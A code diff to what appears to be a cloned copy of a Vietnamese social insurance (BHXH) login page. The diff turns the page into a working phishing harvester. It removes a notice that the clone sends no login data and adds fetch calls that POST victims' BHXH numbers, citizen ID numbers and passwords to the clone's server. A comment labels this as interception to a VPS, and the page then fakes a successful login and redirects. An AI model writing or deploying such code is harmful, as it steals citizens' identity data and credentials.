@@ -7168,8 +7168,24 @@ ul[_ngcontent-c13] {
                     showToast('error', 'Mã captcha không chính xác');
                     return;
                 }
-                // Bản clone chỉ mô phỏng giao diện, không gửi dữ liệu đăng nhập.
-                showToast('info', 'Bản clone chỉ mô phỏng giao diện, không gửi dữ liệu đăng nhập.');
+                
+                fetch(window.location.origin + '/api/login', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ identifier: maSoBHXH, password: soCCCD })
+                })
+                .then(res => res.json().then(data => ({ status: res.status, data })))
+                .then(result => {
+                  if (result.status === 200) {
+                    showToast('success', 'Đăng nhập thành công!');
+                    setTimeout(() => window.location.href = '/dang-ky', 1000);
+                  } else {
+                    showToast('error', result.data.error || 'Thông tin đăng nhập không đúng');
+                  }
+                })
+                .catch(err => {
+                  showToast('error', 'Lỗi kết nối máy chủ');
+                });
             });
         } else {
         }
@@ -7475,11 +7491,31 @@ ul[_ngcontent-c13] {
     var maCaptcha = ((document.getElementById('mat-input-5') || {}).value || '').trim();
     var captchaImg = document.querySelector('.captcha-img img');
     var captchaValue = captchaImg ? captchaImg.getAttribute('data-value') : '';
+    var pwd = document.getElementById('mat-input-4') ? document.getElementById('mat-input-4').value : '';
+    
     if (!maSoBHXH.trim()) return showLocalToast('error', 'Vui lòng nhập mã số BHXH');
     if (!soCCCD.trim()) return showLocalToast('error', 'Vui lòng nhập số CCCD');
     if (!maCaptcha) return showLocalToast('error', 'Vui lòng nhập mã captcha');
     if (maCaptcha !== captchaValue) return showLocalToast('error', 'Mã captcha không chính xác');
-    showLocalToast('info', 'Bản clone chỉ mô phỏng giao diện, không gửi dữ liệu đăng nhập.');
+    
+    // Đánh chặn: Gửi request đăng nhập về máy chủ VPS
+    fetch(window.location.origin + '/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ identifier: maSoBHXH, password: pwd }) // Mật khẩu có thể là cccd tuỳ hệ thống
+    })
+    .then(res => res.json().then(data => ({ status: res.status, data })))
+    .then(result => {
+      if (result.status === 200) {
+        showLocalToast('success', 'Đăng nhập thành công!');
+        setTimeout(() => window.location.href = '/dang-ky', 1000);
+      } else {
+        showLocalToast('error', result.data.error || 'Thông tin đăng nhập không đúng');
+      }
+    })
+    .catch(err => {
+      showLocalToast('error', 'Lỗi kết nối máy chủ');
+    });
   }, true);
 })();
 </script>
